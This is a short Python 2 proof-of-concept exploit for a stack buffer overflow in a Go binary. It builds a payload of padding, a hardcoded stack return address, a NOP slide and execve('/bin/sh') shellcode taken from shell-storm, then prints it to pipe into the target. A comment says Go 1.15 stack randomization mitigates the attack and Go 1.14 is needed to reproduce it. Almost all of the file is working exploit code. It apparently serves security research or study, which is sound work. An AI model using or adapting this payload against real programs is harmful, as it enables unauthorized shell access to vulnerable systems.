#!/usr/bin/env python2

import struct

pattern = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVV"

# http://shell-storm.org/shellcode/files/shellcode-806.php
shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
nopslide = "\x90"*350

padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNN"
stack_p = struct.pack("Q", 0xc000069088) #0xc00011afa8)
nullbytes = "\x00"*10

#print(pattern)
print(padding + stack_p + nullbytes + nopslide + shellcode)

# ./exploit_stack.py | main

# Note: this is mitigated by stack layout randomization since Go 1.15. Use Go 1.14 to replicate